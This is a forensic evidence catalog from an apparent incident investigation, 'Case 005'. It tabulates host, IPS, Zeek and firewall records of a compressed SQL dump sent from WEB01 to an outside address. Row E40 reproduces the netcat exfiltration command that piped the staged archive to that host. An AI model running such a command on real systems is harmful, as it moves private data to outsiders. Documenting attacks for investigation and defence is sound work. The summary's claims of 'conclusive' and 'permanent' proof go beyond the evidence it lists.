# Case 005 — Evidentiary Artifacts Catalog

This catalog documents all forensic evidence items collected, normalized, and evaluated during the investigation of Case 005.

---

## 1. Structured Evidence Table

| Evidence ID | Producing Source | Detection / Event Class | Normalized Telemetry Observation | Evidence Classification | Supports Hypothesis |
| :--- | :--- | :--- | :--- | :---: | :---: |
| **E40** | `WEB01` (Linux Shell) | Host Command Audit | `nc 203.0.113.25 9999 < /tmp/_6f9beb897020ebe5.sql.gz`. | `DIRECT` | H1, H3 |
| **E41** | `SURICATA-IPS01` | `A13` (Suricata IPS) | SID `1101021`, alert from `10.10.34.13` to `203.0.113.25:9999`, action: `allowed`. | `DIRECT` | H1, H2 |
| **E42** | `ZEEK-SENSOR01` | Network NDR Metadata | Flow `10.10.34.13` $\rightarrow$ `203.0.113.25:9999`, `duration=3.42s`, `orig_bytes=4,194,304` (4.19 MB). | `DIRECT` | H1 |
| **E43** | Staged vs Exfiltrated | Corroborated Artifact | File `/tmp/_6f9beb897020ebe5.sql.gz` size (4.1 MB) matches transferred bytes (4.19 MB). | `CORRELATED` | H1 |
| **E44** | `PFSENSE-01` | Firewall Validation | Filterlog record: `10.10.34.13` $\rightarrow$ `203.0.113.25:9999`, `action=block`. | `DIRECT` | H3 |
| **E45** | Payload Reconstruction | Full Data Proof | Unbroken SHA-256 hash comparison between staged file and PCAP payload stream. | `UNVERIFIED` (No PCAP retained) / `INFERRED` | H1 |

---

## 2. Evidence Assessment Summary
* **Total Direct Evidentiary Artifacts**: 4 (`E40`, `E41`, `E42`, `E44`).
* **Total Correlated Artifacts**: 1 (`E43`).
* **Total Inferred / Unverified Artifacts**: 1 (`E45`).
* **Verification**: Real-time network and host telemetry conclusively prove that 4.19 MB was streamed to external IP `203.0.113.25:9999`. Post-remediation firewall telemetry conclusively proves subsequent connections on that port are permanently blocked.
